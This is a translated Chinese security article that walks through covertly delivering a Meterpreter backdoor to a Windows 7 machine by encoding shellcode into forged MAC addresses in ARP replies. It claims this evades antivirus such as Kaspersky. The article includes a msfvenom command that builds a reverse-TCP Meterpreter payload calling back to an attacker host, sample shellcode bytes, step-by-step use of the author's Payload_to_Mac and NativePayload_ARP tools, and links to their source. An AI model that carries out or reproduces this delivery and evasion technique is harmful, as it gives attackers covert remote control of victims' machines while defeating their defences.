> 原文链接: https://www.anquanke.com//post/id/181737 


# 通过ARP流量绕过杀毒软件传输后门payload


                                阅读量   
                                **209793**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">8</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Damon Mohammadbagher，文章来源：peerlyst.com
                                <br>原文地址：[https://www.peerlyst.com/posts/transfer-backdoor-payloads-by-arp-traffic-and-bypassing-avs-damon-mohammadbagher](https://www.peerlyst.com/posts/transfer-backdoor-payloads-by-arp-traffic-and-bypassing-avs-damon-mohammadbagher)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01905442cf7f634b71.png)](https://p0.ssl.qhimg.com/t01905442cf7f634b71.png)



本文介绍了如何在网络中使用ARP来实现Payload传输。值得说明的是，大多数反病毒软件都无法检测到后门payload。

在解释此技术之前，本文将首先介绍ARP协议在网络中的工作原理。

## 0x01 ARP工作原理

[![](https://p1.ssl.qhimg.com/t0135a07345d2025e25.gif)](https://p1.ssl.qhimg.com/t0135a07345d2025e25.gif)

如图一所示（ARP，step1），机器A广播消息到所有工作站来询问IP地址的所有者(如192.168.1.5)，并期望接收到其对应的MAC地址

在step2中，机器B发送一个响应包到机器A,告诉机器A,192.168.1.5是我机器B，并告诉机器A自己的MAC地址。这一步是本文的重点，是使用ARP传输payload的技术点所在。

Step3与本文的技术无关，不再赘述。



## 0x02 如何通过ARP传输payload

攻击者可以通过MAC地址传输他们的字节码，利用这种方法黑客可以有效地隐蔽传输病毒和payload。当然应用这种技术传输非常缓慢，但有时这是一个优点，可以有效避免过快的传输被目标运维人员发现。并且此技术成功建立连接的时间并不重要，因为你的服务器或客户机(尤其是服务器)24小时都在运行。

想要执行该攻击，一个攻击者往往需要两台计算机。第一个系统是linux，记为攻击机A，第二个系统是Win7-SP1 (可以任意改变MAC地址)，记为攻击机B。被攻击目标系统也是Win7-SP1。

在攻击过程中，目标系统是将被植入后门的系统，它首先发送ARP请求包询问192.168.1.5的MAC地址，然后我们的攻击机B回复该ARP请求，并伪造MAC地址，注意，此处的MAC包的数据为攻击机A产生的攻击payload（具体路由为攻击机A(192.168.1.50)发送payload（伪造的MAC包）-&gt;攻击机B(192.168.1.5)-&gt;目标机器(192.168.1.113)）。通过不断地发送返回的MAC包最终在目标系统上成功植入后门，我将会得到一个由目标机器(192.1618.1.113)返回到攻击机A(192.168.1.50)的Meterpreter Session。在本文的实验中，成功植入后门花费了37分钟。

[![](https://p3.ssl.qhimg.com/t017bb15fe60f71a4ea.png)](https://p3.ssl.qhimg.com/t017bb15fe60f71a4ea.png)



## 0x03 攻击可能出现的问题

该攻击虽然攻击耗时较长，但是可以成功攻击。不过该攻击需要实现还需要一些前提。在解释问题所在之前，首先我会用一个简单的例子向你展示我的代码是如何工作的:

[![](https://p3.ssl.qhimg.com/t01ac7a1385089bbf55.png)](https://p3.ssl.qhimg.com/t01ac7a1385089bbf55.png)

### <a class="reference-link" name="1.%E6%B3%A8%E5%85%A5payload%E5%AD%97%E8%8A%82"></a>1.注入payload字节

如图3中第一行所示，我们有一个MAC地址：00fc4883e4f0，这个MAC地址有两个部分，第一个部分是 00 , 第二个部分是fc4883e4f0 。

第二部分是Meterpreter payload第一行的第一部分字节，它不是一个MAC地址，但可以像MAC地址一样在ARP传输中使用。

通过我编写的工具“Payload_to_Mac.exe”使得设置和改变NIC网络接口连接MAC变得非常简单。这个工具的工作原理类似于Linux系统中的MAC变址系统。对于图3中的第1行使用这个工具，可以设置MAC地址00fc4883e4f0为“Local Area Connection（本地连接）”

为什么我们需要这样做？

因为我们想用注入的mac地址来回复ARP请求。

到目前为止我们的条件有：
- 本地连接&lt;=&gt;MAC变址系统
- 被入侵的系统&lt;=&gt;后门系统
[![](https://p2.ssl.qhimg.com/t018a42dcbe165affb8.png)](https://p2.ssl.qhimg.com/t018a42dcbe165affb8.png)

接收到这三个响应后，我们可以dump出这些payload:

``{`fc4883e4f0+e8cc000000+4151415052`}`==fc4883e4f0e8cc0000004151415052`

被后门入侵的系统（目标机器）IP地址为192.168.1.113，攻击者的win7-sp1系统（攻击机B）的IP地址为192.168.1.5。现在请对比一下图三和图四，可以看到这是在本攻击中通过ARP传输payload的ARP流量情况

注意：Arpspoof，etthercap工具在linux系统中,使用工具Arpspoof的流量可能会被反病毒软件或者防火墙检测到,但是通过本文的方法在网络中或者在目标入侵系统中被反病毒软件或防火墙检测到的风险非常低。

注意：MAC的复制可能会出现问题，通过图6中的技术，可以降低这种风险。

### <a class="reference-link" name="2.%E6%94%BB%E5%87%BB%E4%B8%AD%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98"></a>2.攻击中可能出现的问题

[![](https://p4.ssl.qhimg.com/t01d08c3bb8871ab4c6.png)](https://p4.ssl.qhimg.com/t01d08c3bb8871ab4c6.png)

现在我们有了响应后的payloads:

``{`fc4883e4f0 + 000c4dabc000 + e8cc000000 + 4151415052`}` == fc4883e4f0000c4dabc000e8cc0000004151415052`

如图5所示，有红色标出的Mac地址，现在的payload是不正确的。

那么如何解决这个问题呢? 如图6所示

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e461ddc8982381c1.png)

可以将payload从两个部分更改为三个部分：

`00`{`payload`}`——&gt;`{`payload`}`00 00 f0`

现在你可以检查后门代码中新的部分，当你收到一个没有第三部分的MAC地址，你的代码应该丢弃这个MAC地址。因为这是未知的响应，所以这不是有效payload。

现在可以开始利用工具进行攻击，但首先应该生成payload：在kali linux系统中，可以使用msfvenom来生成payload。其IP地址是192.168.1.50。

```
msfvenom –arch x86_64 –platform windows –p windows/x64/meterpreter/reverse_tcp lhsot=192.168.1.50 –f c &gt; /root/desktop/payload.txt
```

接下来将payload.txt用图7所示的格式，从linux系统复制到IP地址为 192.168.1.5的攻击机B

[![](https://p1.ssl.qhimg.com/t0159eec5c334a62681.png)](https://p1.ssl.qhimg.com/t0159eec5c334a62681.png)

使用Payload_to_Mac.exe工具：

现在使用图7中的payload和图8中的工具，这样就可以从payload.txt中复制payload，然后将其粘贴到工具Payload_to_Mac.exe上。

```
执行命令：
Payload_to_Mac.exe null payload
```

注意：这里需要以管理员身份运行cmd才能更改MAC地址。

不带选项运行工具的情况下，可以看到这个工具的命令选项说明。

[![](https://p1.ssl.qhimg.com/t01800a26695ad98297.png)](https://p1.ssl.qhimg.com/t01800a26695ad98297.png)

在下图中你将会看到我使用null+PAYLOAD的命令

[![](https://p2.ssl.qhimg.com/t01ad142793b1e469f1.png)](https://p2.ssl.qhimg.com/t01ad142793b1e469f1.png)

现在复制cmd中的所有行并粘贴到一个BAT文件中，例如图9所示Macchanger.BAT。同样地，也应该用管理员身份运行它。

在此步骤中，应该在第一行中添加如图9所示的MAC地址。

这个MAC地址是在我的代码中开始ARP传输的标志，所以应该手动添加这一行并保存。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0156b1eb337502da3c.png)

接下来这一步如图10在文件最后一行添加新行。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f83930c3273962d8.png)

这个MAC地址是完成ARP传输的标志。

现在，在这个步骤中，你应该检查网络适配器和注册表Regkey_Parent中的这些属性：要在Win7中更改mac地址，需要在windows中通过以下路径找到注册表地址：`"SYSTEMCurrentControlSetControlClass`{`4D36E972-E325-11CE-BFC1-08002BE10318`}`"`

检查完这条路径后你应该找到你的`Parent_Regkey`，在这个例子中，对于我的windows系统`Parent_Regkey`是0007，如图11所示。在0007中找到了我的NIC

`"Driver Desc "`

Driver Desc = Intel® PRO/1000 MT Network

可以看到我的网络连接`Local Area Connection`属性与这个`Regkey`相同，都是`Intel®PRO/1000 MT Network`，所以我正确的Parent_REGKEY就是0007。但并不是所有的Windows系统都是一样的，所以可能在你的系统中这个数字是不同的。最后，我应该一行一行地将BAT文件中的所有`Connection Name`从`Local Network Connection`更改为`Local Area Connection`。

注意：记住`Local Area Connection`IP地址静态等于192.168.1.5

在本例中，你应该使用静态IP地址 192.168.1.5，在图11中，你可以看到这些属性取决于你的windows系统设置

[![](https://p5.ssl.qhimg.com/t01e9e35e41ede8a20b.jpg)](https://p5.ssl.qhimg.com/t01e9e35e41ede8a20b.jpg)

注意:如果在BAT文件中的设置与注册表和NIC名称不匹配，此工具无法更改Mac地址。

设置Payload_to_mac.exe完成后，应该在目标机器上运行NativePayload_ARP.exe后再在攻击机B上运行Payload_to_mac.exe，这是关键点。

接下来应该通过NativePayload_ARP.exe传输带有ARP流量的 Meterpreter payload然后在目标机器上运行它。



## 0x04 NativePayload_app.exe使用步骤:

步骤1:

使用如图12这样的工具（不带参数）:

运行此工具后，你可以输入IP地址，将ARP流量发送到此IP (攻击机B)(本例中为192.168.1.5)，然后回车。

接下来，应该输入你的本地IP地址（目标机器），以便通过这个IP地址发送ARP请求，然后回车。

在本例中，本地IP地址是192.168.1.113，这是目标系统的IP地址。注意:目标系统IP地址是(192.168.1.113)， NativePayload_app .exe在目标系统上运行，如图12所示。

[![](https://p2.ssl.qhimg.com/t01a06692a7d8554290.png)](https://p2.ssl.qhimg.com/t01a06692a7d8554290.png)

最后在38分钟后，Meterpreter session建立，如图13所示。

[![](https://p4.ssl.qhimg.com/t01c3897c43d9a17b17.png)](https://p4.ssl.qhimg.com/t01c3897c43d9a17b17.png)

我拥有世界上最好的杀毒软件，但是我的payload流量都没经过加密就可以把他绕过了。如图14所示，通过这种技术绕过了Kaspersky。

[![](https://p4.ssl.qhimg.com/t013725ebc257a2148b.png)](https://p4.ssl.qhimg.com/t013725ebc257a2148b.png)

但是请注意，这个脚本只适用于Llinux系统

[![](https://p4.ssl.qhimg.com/t0183056187adcf0a85.jpg)](https://p4.ssl.qhimg.com/t0183056187adcf0a85.jpg)



## 0x05 相关资源

图15中的脚本：<br>
（[https://www.peerlyst.com/posts/simple-way-for-transferring-data-via-arp-traffic-linux-only-damon-mohammadbagher）](https://www.peerlyst.com/posts/simple-way-for-transferring-data-via-arp-traffic-linux-only-damon-mohammadbagher%EF%BC%89)<br>
Github源代码(Beta）:<br>
（[http://github.com/DamonMohammadbagher/NativePayload_ARP）](http://github.com/DamonMohammadbagher/NativePayload_ARP)<br>
攻击视频:<br>
（[https://youtu.be/qDLicXj7Vuk）](https://youtu.be/qDLicXj7Vuk%EF%BC%89)
